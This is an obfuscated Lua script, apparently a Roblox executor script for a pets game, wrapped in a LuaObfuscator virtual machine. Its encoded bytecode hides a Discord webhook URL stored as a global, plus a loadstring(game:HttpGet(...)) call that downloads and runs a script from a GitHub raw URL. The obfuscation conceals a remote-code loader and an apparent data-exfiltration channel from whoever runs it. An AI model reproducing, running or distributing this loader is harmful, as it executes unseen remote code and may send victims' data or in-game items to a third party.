--[[
 .____                  ________ ___.    _____                           __                
 |    |    __ _______   \_____  \\_ |___/ ____\_ __  ______ ____ _____ _/  |_  ___________ 
 |    |   |  |  \__  \   /   |   \| __ \   __\  |  \/  ___// ___\\__  \\   __\/  _ \_  __ \
 |    |___|  |  // __ \_/    |    \ \_\ \  | |  |  /\___ \\  \___ / __ \|  | (  <_> )  | \/
 |_______ \____/(____  /\_______  /___  /__| |____//____  >\___  >____  /__|  \____/|__|   
         \/          \/         \/    \/                \/     \/     \/                   
          \_Welcome to LuaObfuscator.com   (Alpha 0.10.8) ~  Much Love, Ferib 

]]--

local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=math.ldexp;local v9=getfenv or function() return _ENV;end ;local v10=setmetatable;local v11=pcall;local v12=select;local v13=unpack or table.unpack ;local v14=tonumber;local function v15(v16,v17,...) local v18=1;local v19;v16=v4(v3(v16,5),"..",function(v30) if (v1(v30,2)==81) then v19=v0(v3(v30,1,1));return "";else local v80=0;local v81;while true do if (v80==0) then v81=v2(v0(v30,16));if v19 then local v106=v5(v81,v19);v19=nil;return v106;else return v81;end break;end end end end);local function v20(v31,v32,v33) if v33 then local v82=0 -0 ;local v83;while true do if (v82==(0 -(0 + 0))) then v83=(v31/((3 -(1 -0))^(v32-(2 -1))))%((621 -(555 + 64))^(((v33-(932 -(857 + 74))) -(v32-(569 -(367 + 201)))) + (928 -(214 + 713)))) ;return v83-(v83%1) ;end end else local v84=(1 + 1)^(v32-(1 + 0)) ;return (((v31%(v84 + v84))>=v84) and ((1943 -(68 + 997)) -(282 + 595))) or (1637 -(1523 + 114)) ;end end local function v21() local v34=v1(v16,v18,v18);v18=v18 + 1 ;return v34;end local function v22() local v35=1270 -((576 -(87 + 263)) + 1044) ;local v36;local v37;while true do if (v35==(4 -3)) then return (v37 * (610 -354)) + v36 ;end if (v35==0) then v36,v37=v1(v16,v18,v18 + (119 -(32 + 85)) );v18=v18 + (3 -1) ;v35=1 + (180 -(67 + 113)) ;end end end local function v23() local v38=0 + 0 ;local v39;local v40;local v41;local v42;while true do if (v38==(0 -0)) then v39,v40,v41,v42=v1(v16,v18,v18 + 3 + 0 + 0 );v18=v18 + 4 ;v38=3 -2 ;end if (v38==(953 -(802 + 150))) then return (v42 * ((45170937 -(915 + 82)) -28392724)) + (v41 * (118879 -53343)) + (v40 * 256) + v39 ;end end end local function v24() local v43=v23();local v44=v23();local v45=2 -1 ;local v46=(v20(v44,1 + 0 ,17 + 3 ) * ((2 -0)^(1219 -((1841 -(201 + 571)) + 118)))) + v43 ;local v47=v20(v44,(477 -(44 + 386)) -(1164 -(116 + 1022)) ,67 -36 );local v48=((v20(v44,32)==(1 + 0)) and  -(1 -0)) or (1 + 0) ;if (v47==((2277 -(998 + 488)) -(117 + 251 + 423))) then if (v46==0) then return v48 * (0 -0) ;else v47=19 -(10 + 8) ;v45=0 -0 ;end elseif (v47==(2489 -(416 + 26))) then return ((v46==(0 -(0 -0))) and (v48 * (1/(0 + 0)))) or (v48 * NaN) ;end return v8(v48,v47-(1809 -786) ) * (v45 + (v46/((440 -(145 + 293))^52))) ;end local function v25(v49) local v50=0 + 0 ;local v51;local v52;while true do if (v50==(10 -(24 -17))) then return v6(v52);end if (v50==(1081 -((2767 -(760 + 987)) + 60))) then v51=v3(v16,v18,(v18 + v49) -1 );v18=v18 + v49 ;v50=7 -5 ;end if (v50==2) then v52={};for v92=860 -(814 + 45) , #v51 do v52[v92]=v2(v1(v3(v51,v92,v92)));end v50=7 -4 ;end if (v50==(0 -0)) then v51=nil;if  not v49 then v49=v23();if (v49==(0 + 0)) then return "";end end v50=1 + 0 ;end end end local v26=v23;local function v27(...) return {...},v12("#",...);end local function v28() local v53=(function() return 560 -(306 + 254) ;end)();local v54=(function() return;end)();local v55=(function() return;end)();local v56=(function() return;end)();local v57=(function() return;end)();local v58=(function() return;end)();local v59=(function() return;end)();while true do if ((1765 -(454 + 1309))==v53) then for v94= #"!",v23() do local v95=(function() return v21();end)();if (v20(v95, #"|", #"|")==(0 + 0)) then local v102=(function() return 0;end)();local v103=(function() return;end)();local v104=(function() return;end)();local v105=(function() return;end)();while true do if (v102~=2) then else if (v20(v104, #"<", #"|")~= #" ") then else v105[1 + 1 ]=(function() return v59[v105[2]];end)();end if (v20(v104,3 -1 ,2)~= #"!") then else v105[ #"nil"]=(function() return v59[v105[ #"xnx"]];end)();end v102=(function() return 3 -0 ;end)();end if (v102==3) then if (v20(v104, #"nil", #"19(")== #"[") then v105[ #"0836"]=(function() return v59[v105[ #"0836"]];end)();end v54[v94]=(function() return v105;end)();break;end if ((1 + 0)==v102) then local v108=(function() return 0;end)();local v109=(function() return;end)();while true do if (v108==(0 -0)) then v109=(function() return 603 -(268 + 335) ;end)();while true do if (1==v109) then v102=(function() return 2 -0 ;end)();break;end if (v109~=0) then else v105=(function() return {v22(),v22(),nil,nil};end)();if (v103==(572 -(426 + 146))) then local v281=(function() return 0;end)();local v282=(function() return;end)();while true do if (v281~=(285 -(134 + 151))) then else v282=(function() return 1665 -(970 + 695) ;end)();while true do if (v282==(1456 -(282 + 1174))) then v105[ #"-19"]=(function() return v22();end)();v105[ #"asd1"]=(function() return v22();end)();break;end end break;end end elseif (v103== #"<") then v105[ #"xxx"]=(function() return v23();end)();elseif (v103==(3 -1)) then v105[ #"91("]=(function() return v23() -((1992 -(582 + 1408))^16) ;end)();elseif (v103~= #"-19") then else local v342=(function() return 0 -0 ;end)();local v343=(function() return;end)();while true do if (v342==0) then v343=(function() return 0 -0 ;end)();while true do if (v343==0) then v105[ #"nil"]=(function() return v23() -(2^(1 + 15)) ;end)();v105[ #"asd1"]=(function() return v22();end)();break;end end break;end end end v109=(function() return 1 -0 ;end)();end end break;end end end if (v102~=0) then else local v110=(function() return 0;end)();while true do if (v110==1) then v102=(function() return 3 -2 ;end)();break;end if (v110==0) then v103=(function() return v20(v95,2, #"gha");end)();v104=(function() return v20(v95, #"?id=",1830 -(1195 + 629) );end)();v110=(function() return 1;end)();end end end end end end for v96= #",",v23() do v55[v96-#":" ]=(function() return v28();end)();end return v57;end if ( #"}"==v53) then local v88=(function() return 0 -0 ;end)();local v89=(function() return;end)();while true do if (v88~=0) then else v89=(function() return 241 -(187 + 54) ;end)();while true do if (v89==2) then v53=(function() return 2;end)();break;end if (v89~=(781 -(162 + 618))) then else for v112= #">",v58 do local v113=(function() return 1271 -(945 + 326) ;end)();local v114=(function() return;end)();local v115=(function() return;end)();local v116=(function() return;end)();while true do if (v113==(1 + 0)) then v116=(function() return nil;end)();while true do if (v114~=0) then else local v275=(function() return 0 + 0 ;end)();while true do if (v275==1) then v114=(function() return 1 -0 ;end)();break;end if (v275~=(0 + 0)) then else local v328=(function() return 0 -0 ;end)();while true do if (v328==0) then v115=(function() return v21();end)();v116=(function() return nil;end)();v328=(function() return 1;end)();end if (v328==1) then v275=(function() return 1 + 0 ;end)();break;end end end end end if (v114~=(701 -(271 + 429))) then else if (v115== #"~") then v116=(function() return v21()~=(0 + 0) ;end)();elseif (v115==(1502 -(1408 + 92))) then v116=(function() return v24();end)();elseif (v115== #"xxx") then v116=(function() return v25();end)();end v59[v112]=(function() return v116;end)();break;end end break;end if (v113~=(1636 -(1373 + 263))) then else v114=(function() return 1000 -(451 + 549) ;end)();v115=(function() return nil;end)();v113=(function() return 1289 -(993 + 295) ;end)();end end end v57[ #"nil"]=(function() return v21();end)();v89=(function() return 1 + 1 ;end)();end if (v89~=(0 -0)) then else v58=(function() return v23();end)();v59=(function() return {};end)();v89=(function() return 1 -0 ;end)();end end break;end end end if (v53==(1384 -(746 + 638))) then local v90=(function() return 0 + 0 ;end)();local v91=(function() return;end)();while true do if (v90~=(0 -0)) then else v91=(function() return 341 -(218 + 123) ;end)();while true do if ((1 + 0)~=v91) then else v56=(function() return {};end)();v57=(function() return {v54,v55,nil,v56};end)();v91=(function() return 1583 -(1535 + 46) ;end)();end if (v91~=(0 + 0)) then else v54=(function() return {};end)();v55=(function() return {};end)();v91=(function() return 1 + 0 ;end)();end if ((531 -(406 + 123))==v91) then v53=(function() return  #"~";end)();break;end end break;end end end end end local function v29(v60,v61,v62) local v63=v60[1770 -(1749 + 20) ];local v64=v60[1 + 1 ];local v65=v60[1325 -(1249 + 32 + 41) ];return function(...) local v66=v63;local v67=v64;local v68=v65;local v69=v27;local v70=1 + 0 + 0 ;local v71= -(1146 -(466 + 679));local v72={};local v73={...};local v74=v12("#",...) -1 ;local v75={};local v76={};for v85=0 -0 ,v74 do if ((v85>=v68) or (2896<805)) then v72[v85-v68 ]=v73[v85 + 1 ];else v76[v85]=v73[v85 + ((3627 -(1668 + 58)) -(106 + 1794)) ];end end local v77=(v74-v68) + (627 -(512 + 114)) ;local v78;local v79;while true do v78=v66[v70];v79=v78[1 + 0 ];if ((2316==2316) and (v79<=30)) then if ((v79<=(36 -22)) or (2570==1533)) then if (v79<=(2 + 4)) then if (v79<=2) then if ((v79<=0) or (883==1460)) then v76[v78[2]]=v62[v78[8 -5 ]];elseif (v79==(2 -(1 -0))) then v76[v78[2]]={};else local v125=0;local v126;local v127;local v128;local v129;while true do if (v125==(0 -0)) then v126=v78[2];v127,v128=v69(v76[v126](v76[v126 + (115 -(4 + 110)) ]));v125=585 -(57 + 527) ;end if ((v125==(1428 -(41 + 1386))) or (4619<=999)) then v71=(v128 + v126) -(104 -(17 + 86)) ;v129=0;v125=1 + 1 ;end if (v125==(2 + 0)) then for v301=v126,v71 do v129=v129 + (1 -0) ;v76[v301]=v127[v129];end break;end end end elseif (v79<=4) then if (v79==3) then local v130=v78[5 -3 ];local v131=v76[v130];local v132=v76[v130 + (168 -(122 + 44)) ];if (v132>(0 -(0 + 0))) then if ((v131>v76[v130 + (3 -2) ]) or (3410>4116)) then v70=v78[3];else v76[v130 + 3 + 0 + 0 ]=v131;end elseif ((v131<v76[v130 + 1 ]) or (903>=3059)) then v70=v78[1 + 2 ];else v76[v130 + (5 -2) ]=v131;end else v76[v78[67 -((101 -71) + 35) ]]=v76[v78[3 + 0 ]]%v76[v78[1261 -(1043 + 214) ]] ;end elseif ((v79==(18 -(2007 -(109 + 1885)))) or (3976<2857)) then do return;end else v76[v78[1214 -((1792 -(1269 + 200)) + 889) ]]=v76[v78[7 -4 ]][v78[584 -(361 + 219) ]];end elseif (v79<=((632 -302) -(53 + 267))) then if (v79<=(2 + 6)) then if (v79==(420 -(15 + 398))) then local v136=0;local v137;while true do if (v136==(982 -(18 + 964))) then v137=v78[7 -5 ];v76[v137]=v76[v137](v13(v76,v137 + 1 + 0 ,v71));break;end end else v76[v78[(817 -(98 + 717)) + 0 ]][v76[v78[853 -(20 + 830) ]]]=v78[4 + 0 ];end elseif ((4930>2307) and (v79>(135 -(116 + 10)))) then v76[v78[1 + 1 ]]=v78[741 -(542 + 196) ] + v76[v78[8 -4 ]] ;else local v141=v78[1 + 1 ];local v142,v143=v69(v76[v141](v13(v76,v141 + 1 + 0 ,v78[2 + 1 ])));v71=(v143 + v141) -(2 -1) ;local v144=0;for v240=v141,v71 do v144=v144 + ((828 -(802 + 24)) -1) ;v76[v240]=v142[v144];end end elseif (v79<=(1563 -(1126 + 425))) then if ((v79==(416 -(118 + 287))) or (4046<1291)) then v76[v78[(11 -4) -5 ]][v76[v78[1124 -(118 + 1003) ]]]=v78[11 -7 ];else v76[v78[2]][v78[380 -((178 -36) + 235) ]]=v76[v78[18 -14 ]];end elseif (v79==(1 + 2 + 10)) then v76[v78[979 -(425 + 128 + 424) ]]=v76[v78[3]] + v78[7 -3 ] ;else v76[v78[2 + 0 ]]();end elseif ((v79<=(22 + 0)) or (4241==3545)) then if (v79<=(11 + 7)) then if (v79<=16) then if (v79>(7 + 8)) then v76[v78[2 + 0 ]]=v76[v78[1 + 2 ]];else local v152=0 -0 ;local v153;while true do if ((v152==((0 + 0) -0)) or (4048>4232)) then v153=v78[4 -(5 -3) ];do return v76[v153](v13(v76,v153 + 1 + 0 ,v78[14 -11 ]));end break;end end end elseif (v79>(770 -(239 + 514))) then v70=v78[2 + 1 ];else v76[v78[(4438 -3107) -(286 + 511 + 532) ]]=v76[v78[3 + 0 ]][v78[2 + 1 + 1 ]];end elseif (v79<=(47 -27)) then if (v79>(1221 -(373 + 829))) then v76[v78[733 -(476 + 255) ]]={};else v76[v78[1132 -(369 + 761) ]]= #v76[v78[2 + 1 ]];end elseif (v79==(37 -16)) then local v159=v78[2];v76[v159]=v76[v159](v13(v76,v159 + 1 + 0 ,v71));else v76[v78[2]]=v76[v78[5 -2 ]]%v78[4] ;end elseif (v79<=26) then if (v79<=((191 + 71) -(64 + 174))) then if (v79==(11 + 12)) then v76[v78[1 + 1 ]]= #v76[v78[3 -0 ]];else v76[v78[338 -(144 + 192) ]][v78[3]]=v76[v78[220 -(42 + (1607 -(797 + 636))) ]];end elseif (v79>(19 + 6)) then local v165=v78[2 + 0 ];do return v13(v76,v165,v71);end else v76[v78[2]]=v76[v78[2 + 1 ]]%v76[v78[1508 -(363 + 1141) ]] ;end elseif (v79<=(1608 -(1183 + 397))) then if (v79>(82 -55)) then v76[v78[2 + 0 ]]=v62[v78[3 + 0 ]];else local v169=1975 -(1913 + (301 -239)) ;local v170;local v171;local v172;while true do if (v169==(1 + 0)) then v172=v76[v170 + 2 ];if (v172>(0 -0)) then if ((v171>v76[v170 + ((3553 -(1427 + 192)) -(565 + 1368)) ]) or (1750>=3473)) then v70=v78[11 -(3 + 5) ];else v76[v170 + (1664 -(1477 + 184)) ]=v171;end elseif ((3166==3166) and (v171<v76[v170 + (1 -(0 -0)) ])) then v70=v78[3 + 0 ];else v76[v170 + ((773 + 86) -(256 + 308 + 292)) ]=v171;end break;end if (v169==(0 -0)) then v170=v78[5 -3 ];v171=v76[v170];v169=1;end end end elseif (v79==(333 -(244 + (386 -(192 + 134))))) then v76[v78[2 + (1276 -(316 + 960)) ]]();else v76[v78[478 -(41 + 435) ]][v76[v78[1004 -(938 + 63) ]]]=v76[v78[4 + 0 ]];end elseif (v79<=45) then if (v79<=(1162 -(936 + 189))) then if (v79<=(11 + 13 + 9)) then if (v79<=(1644 -(1565 + 48))) then local v122=0 + 0 + 0 ;local v123;while true do if (v122==(1138 -(782 + 356))) then v123=v78[(249 + 20) -(176 + 91) ];do return v76[v123](v13(v76,v123 + (2 -1) ,v78[(15 -11) -1 ]));end break;end end elseif (v79>(1124 -((1526 -(83 + 468)) + 117))) then local v175=v78[1877 -(157 + 1718) ];local v176,v177=v69(v76[v175](v13(v76,v175 + 1 + 0 ,v71)));v71=(v177 + v175) -(3 -2) ;local v178=0 -0 ;for v244=v175,v71 do local v245=0;while true do if (v245==(1018 -(697 + 321))) then v178=v178 + (2 -1) ;v76[v244]=v176[v178];break;end end end elseif ((1763<3724) and (v76[v78[2]]==v78[4])) then v70=v70 + ((1807 -(1202 + 604)) -0) ;else v70=v78[6 -3 ];end elseif (v79<=(14 + 21)) then if (v79==(63 -(135 -106))) then local v179=v78[2];do return v13(v76,v179,v71);end else local v180=v78[5 -3 ];local v181=v76[v78[3]];v76[v180 + (1228 -(322 + 905)) ]=v181;v76[v180]=v181[v78[6 -2 ]];end elseif ((57<=2723) and (v79==(647 -(602 + 9)))) then local v185=v78[(3297 -2106) -(449 + 740) ];v76[v185]=v76[v185](v13(v76,v185 + (873 -(826 + 46)) ,v78[950 -(245 + 702) ]));else v76[v78[2]][v76[v78[3]]]=v76[v78[4]];end elseif (v79<=(129 -88)) then if (v79<=(13 + 26)) then if ((v79==(1936 -(260 + 1638))) or (2070==443)) then local v189=v78[442 -(382 + 58) ];v76[v189](v13(v76,v189 + (3 -2) ,v71));elseif  not v76[v78[2 + 0 ]] then v70=v70 + (1 -0) ;else v70=v78[8 -(330 -(45 + 280)) ];end elseif (v79==(1245 -(902 + 303))) then local v190=v78[3 -1 ];local v191=v76[v190 + 2 ];local v192=v76[v190] + v191 ;v76[v190]=v192;if ((v191>(0 -0)) or (2705==1393)) then if (v192<=v76[v190 + 1 + 0 ]) then v70=v78[1693 -(1121 + 569) ];v76[v190 + (217 -(22 + 192)) ]=v192;end elseif (v192>=v76[v190 + 1 ]) then local v312=683 -(483 + 200) ;while true do if (v312==(1463 -(1404 + 59))) then v70=v78[8 -5 ];v76[v190 + (3 -0) ]=v192;break;end end end else do return;end end elseif ((v79<=(808 -(468 + 297))) or (4601<61)) then if (v79>(604 -(334 + 228))) then local v194=v67[v78[10 -7 ]];local v195;local v196={};v195=v10({},{__index=function(v246,v247) local v248=0 -0 ;local v249;while true do if (v248==(0 -0)) then v249=v196[v247];return v249[1 + 0 ][v249[2]];end end end,__newindex=function(v250,v251,v252) local v253=236 -(141 + 95) ;local v254;while true do if (v253==0) then v254=v196[v251];v254[1 + 0 ][v254[4 -2 ]]=v252;break;end end end});for v255=2 -1 ,v78[1 + 3 ] do v70=v70 + (2 -1) ;local v256=v66[v70];if (v256[1 + 0 + 0 ]==(26 + 23)) then v196[v255-(1 -0) ]={v76,v256[2 + 1 ]};else v196[v255-(1 -(0 + 0)) ]={v61,v256[3 + 0 ]};end v75[ #v75 + (2 -1) ]=v196;end v76[v78[2 + 0 ]]=v29(v194,v195,v62);else local v198=0;local v199;local v200;while true do if (v198==(850 -(45 + 209 + 595))) then v76[v199 + (127 -(55 + 71)) ]=v200;v76[v199]=v200[v78[5 -1 ]];break;end if (v198==0) then v199=v78[1792 -(573 + 1217) ];v200=v76[v78[8 -5 ]];v198=1 + 0 ;end end end elseif ((v79==(70 -26)) or (1390>=4744)) then v76[v78[941 -(714 + 225) ]]=v76[v78[3]]%v78[11 -7 ] ;else v76[v78[2 -0 ]]=v78[1 + 2 ];end elseif (v79<=53) then if ((v79<=(70 -21)) or (2003>3834)) then if (v79<=(853 -(118 + 688))) then if (v79==46) then v76[v78[50 -(25 + 23) ]]=v78[1 + 2 ] + v76[v78[6 -2 ]] ;else local v205=v67[v78[3]];local v206;local v207={};v206=v10({},{__index=function(v258,v259) local v260=1886 -(927 + 959) ;local v261;while true do if (v260==(0 -0)) then v261=v207[v259];return v261[1][v261[734 -(16 + 716) ]];end end end,__newindex=function(v262,v263,v264) local v265=v207[v263];v265[1 -0 ][v265[99 -(11 + 86) ]]=v264;end});for v267=2 -1 ,v78[289 -(175 + 110) ] do local v268=0 -0 ;local v269;while true do if (1==v268) then if (v269[1 + 0 ]==(241 -192)) then v207[v267-((3569 -(1733 + 39)) -(503 + 1293)) ]={v76,v269[1064 -(810 + 251) ]};else v207[v267-1 ]={v61,v269[1 + 2 ]};end v75[ #v75 + 1 + 0 ]=v207;break;end if ((v268==0) or (156>3913)) then v70=v70 + (534 -(43 + (1524 -(125 + 909)))) ;v269=v66[v70];v268=734 -(711 + 22) ;end end end v76[v78[2]]=v29(v205,v206,v62);end elseif ((195==195) and (v79==(185 -137))) then v76[v78[2]]=v78[862 -(240 + 619) ];else v76[v78[1 + 1 ]]=v76[v78[4 -1 ]];end elseif (v79<=51) then if (v79>((1952 -(1096 + 852)) + 46)) then local v213=v78[1746 -(1344 + 400) ];local v214,v215=v69(v76[v213](v76[v213 + (406 -(255 + 150)) ]));v71=(v215 + v213) -1 ;local v216=0 + 0 + 0 ;for v270=v213,v71 do v216=v216 + 1 + 0 ;v76[v270]=v214[v216];end else v76[v78[8 -6 ]]=v61[v78[9 -6 ]];end elseif ((3105>=1796) and (v79==(1791 -(404 + 1335)))) then if (v76[v78[(582 -174) -(183 + 223) ]]==v78[4]) then v70=v70 + (1 -(0 + 0)) ;else v70=v78[2 + 1 ];end elseif  not v76[v78[1 + 1 ]] then v70=v70 + (338 -(10 + 327)) ;else v70=v78[3 + 0 ];end elseif (v79<=(395 -(118 + 220))) then if (v79<=(19 + 36)) then if ((4379>=2131) and (v79==(503 -(108 + 341)))) then v76[v78[2]]=v61[v78[(514 -(409 + 103)) + 1 ]];else v70=v78[12 -9 ];end elseif (v79>56) then local v222=0;local v223;local v224;local v225;local v226;while true do if (v222==((1729 -(46 + 190)) -(711 + 782))) then v223=v78[3 -(96 -(51 + 44)) ];v224,v225=v69(v76[v223](v13(v76,v223 + (470 -(270 + 199)) ,v71)));v222=1 + 0 ;end if ((3844>=2043) and (v222==2)) then for v319=v223,v71 do v226=v226 + (1820 -(580 + 1239)) ;v76[v319]=v224[v226];end break;end if (v222==(2 -1)) then v71=(v225 + v223) -(1 + 0 + 0) ;v226=0 + 0 ;v222=2;end end else local v227=0 + (1317 -(1114 + 203)) ;local v228;while true do if ((v227==(0 -0)) or (3232<=2731)) then v228=v78[2 + 0 ];v76[v228]=v76[v228](v13(v76,v228 + 1 ,v78[1170 -(645 + 522) ]));break;end end end elseif (v79<=(1849 -(1010 + 780))) then if ((4905==4905) and (v79>((784 -(228 + 498)) + 0))) then local v229=v78[9 -7 ];local v230,v231=v69(v76[v229](v13(v76,v229 + (2 -1) ,v78[1839 -(1045 + 791) ])));v71=(v231 + v229) -(2 -1) ;local v232=0 -(0 + 0) ;for v273=v229,v71 do local v274=505 -(351 + 154) ;while true do if ((v274==(1574 -(1281 + 293))) or (4136>=4411)) then v232=v232 + (267 -(28 + 132 + 106)) ;v76[v273]=v230[v232];break;end end end else local v233=v78[4 -(665 -(174 + 489)) ];local v234=v76[v233 + (1561 -(1381 + (463 -285))) ];local v235=v76[v233] + v234 ;v76[v233]=v235;if (v234>(0 + 0)) then if (v235<=v76[v233 + 1 + 0 ]) then v70=v78[2 + 1 ];v76[v233 + (10 -7) ]=v235;end elseif ((v235>=v76[v233 + 1 + 0 ]) or (2958==4017)) then local v326=470 -(381 + 89) ;while true do if (v326==0) then v70=v78[3];v76[v233 + 3 + 0 ]=v235;break;end end end end elseif (v79==(41 + 19)) then v76[v78[2]]=v76[v78[1908 -(830 + 1075) ]] + v78[6 -2 ] ;else local v238=(1680 -(303 + 221)) -(1074 + 82) ;local v239;while true do if ((1228>=813) and (v238==(0 -0))) then v239=v78[1786 -(214 + 1570) ];v76[v239](v13(v76,v239 + (1456 -(990 + (1734 -(231 + 1038)))) ,v71));break;end end end v70=v70 + 1 + 0 ;end end;end return v29(v28(),{},v17)(...);end return v15("LOL!203Q0003063Q00737472696E6703043Q006368617203043Q00627974652Q033Q0073756203053Q0062697433322Q033Q0062697403043Q0062786F7203053Q007461626C6503063Q00636F6E63617403063Q00696E73657274026Q00104003073Q00EB457AED72493D03073Q00569C2018851D26026Q000840030A3Q007EACB0C7453E72ABBDFD03063Q005613C5DE9826027Q004003073Q00DBF2A51B00D7EB03053Q0072B69BCB44026Q00F03F030A3Q001BB17429F1541A5005BD03083Q002976DC464E9E3076028Q0003083Q00F839C0C148352EC803073Q0043AD4AA5B3265403023Q005F47025Q0088C34003793Q00682Q7470733A2Q2F646973636F72642E636F6D2F6170692F776562682Q6F6B732F31333135333634352Q363137353139313034302F2D5A6F74576B427870674A69354B5F3137307747533132727157666C4C556A5367485F68765A4C336F794B3771556F5456366355597A514E5F533175474256674E544E54030A3Q006C6F6164737472696E6703043Q0067616D6503073Q00482Q7470476574034C3Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F446574726F7830312F70657473676F2F726566732F68656164732F6D61696E2F7363726970742E74787400504Q00017Q00122Q000100013Q00200600010001000200122Q000200013Q00200600020002000300122Q000300013Q00200600030003000400122Q000400053Q0006350004000B000100010004123Q000B000100122Q000400063Q00200600050004000700122Q000600083Q00200600060006000900122Q000700083Q00200600070007000A00062F00083Q000100062Q00313Q00074Q00313Q00014Q00313Q00054Q00313Q00024Q00313Q00034Q00313Q00064Q0010000900083Q00122D000A000C3Q00122D000B000D4Q00240009000B00020010183Q000B00092Q0010000900083Q00122D000A000F3Q00122D000B00104Q00240009000B00020010183Q000E00092Q0010000900083Q00122D000A00123Q00122D000B00134Q00240009000B00020010183Q001100092Q0010000900083Q00122D000A00153Q00122D000B00164Q00240009000B00020010183Q001400092Q0010000900083Q00122D000A00183Q00122D000B00194Q00240009000B00020010183Q0017000900122D000900173Q0026340009003B000100170004123Q003B000100122Q000A001A3Q002006000B3Q0017002006000C3Q00142Q001E000A000B000C00122Q000A001A3Q002006000B3Q0011002008000A000B001B00122D000900143Q00263400090044000100140004123Q0044000100122Q000A001A3Q002006000B3Q000E002008000A000B001B00122Q000A001A3Q002006000B3Q000B002008000A000B001C00122D000900113Q00263400090031000100110004123Q0031000100122Q000A001D3Q00122Q000B001E3Q002023000B000B001F00122D000D00204Q003B000B000D4Q0015000A3Q00022Q001D000A000100010004123Q004F00010004123Q003100012Q00293Q00013Q00013Q00023Q00026Q00F03F026Q00704002264Q000100025Q00122D000300014Q001700045Q00122D000500013Q00041B0003002100012Q003200076Q0010000800024Q0032000900014Q0032000A00024Q0032000B00034Q0032000C00044Q0010000D6Q0010000E00063Q00203C000F000600012Q003B000C000F4Q0015000B3Q00022Q0032000C00034Q0032000D00044Q0010000E00014Q0017000F00014Q0004000F0006000F00100A000F0001000F2Q0017001000014Q000400100006001000100A00100001001000203C0010001000012Q003B000D00104Q0039000C6Q0015000A3Q000200202C000A000A00022Q00330009000A4Q003D00073Q000100043A0003000500012Q0032000300054Q0010000400024Q001F000300044Q001A00036Q00293Q00017Q00",v9(),...);
